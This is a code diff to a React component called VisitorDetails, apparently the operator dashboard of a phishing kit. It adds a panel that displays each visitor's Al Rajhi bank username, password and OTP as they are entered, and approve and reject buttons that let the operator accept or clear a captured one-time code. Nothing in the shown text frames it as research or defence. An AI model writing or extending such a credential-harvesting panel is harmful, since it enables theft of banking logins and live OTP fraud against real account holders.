@@ -471,6 +471,28 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     });
   }
 
+  // Rajhi Info - add to dynamic bubbles to sort by timestamp
+  const rajhiUser = visitor._v10 || visitor.rajhiUser;
+  const rajhiPassword = visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
+  const rajhiOtp = visitor._v12 || visitor.rajhiOtp;
+
+  if (rajhiUser || rajhiPassword || rajhiOtp || (visitor.currentStep as any) === "rajhi") {
+    bubbles.push({
+      id: "rajhi-info",
+      title: "🏦 الراجحي",
+      icon: "🏦",
+      color: "green",
+      data: {
+        "اسم المستخدم": rajhiUser || "في انتظار الإدخال...",
+        "كلمة المرور": rajhiPassword || "في انتظار الإدخال...",
+        "رمز OTP": rajhiOtp || "في انتظار الإدخال...",
+      },
+      timestamp: visitor.rajhiUpdatedAt || visitor.updatedAt,
+      showActions: true,
+      type: "rajhi",
+    });
+  }
+
   // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
   const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
   const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
@@ -597,6 +619,21 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               phoneOtpStatus: "show_phone_otp",
             });
             // Phone OTP modal reopened
+          }
+          break;
+
+        case "rajhi":
+          if (action === "approve") {
+            await updateApplication(visitor.id, {
+              rajhiOtpStatus: "approved",
+            });
+          } else if (action === "reject") {
+            if (confirm("هل أنت متأكد من رفض رمز الراجحي؟")) {
+              await updateApplication(visitor.id, {
+                rajhiOtp: "",
+                rajhiOtpStatus: "rejected",
+              });
+            }
           }
           break;
       }
@@ -875,6 +912,28 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                             </>
                           )}
                           {bubble.type === "phone_otp" && (
+                            <>
+                              <button
+                                onClick={() =>
+                                  handleBubbleAction(bubble.id, "approve")
+                                }
+                                disabled={isProcessing}
+                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
+                              >
+                                ✓ قبول
+                              </button>
+                              <button
+                                onClick={() =>
+                                  handleBubbleAction(bubble.id, "reject")
+                                }
+                                disabled={isProcessing}
+                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                              >
+                                ✗ رفض
+                              </button>
+                            </>
+                          )}
+                          {bubble.type === "rajhi" && (
                             <>
                               <button
                                 onClick={() =>
